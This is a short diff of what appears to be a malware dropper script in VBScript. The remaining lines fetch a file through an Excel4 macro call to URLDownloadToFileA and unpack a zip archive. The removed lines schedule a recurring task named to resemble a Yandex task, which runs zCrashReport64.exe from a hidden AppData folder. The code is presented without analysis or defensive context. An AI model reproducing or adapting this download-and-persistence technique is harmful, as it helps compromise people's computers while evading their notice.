@@ -13,7 +13,3 @@ call excelObj.ExecuteExcel4Macro("CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJ
 WScript.Sleep 17000
 set FilesInZip=objShell.NameSpace(FilePath).items
 objShell.NameSpace(strDirectory).CopyHere(FilesInZip)
-WScript.Sleep 16000
-Commandline = "/Create /SC DAILY /TN YandexE84AC6E3495D /ST 00:30 /du 24:00 /RI 20 /F /TR %LOCALAPPDATA%\sleeper_01\zCrashReport64.exe"
-call excelObj.ExecuteExcel4Macro("CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"", 0,""open"",""C:\Windows\System32\schtasks.exe"","""+Commandline+""",0,5)")
-
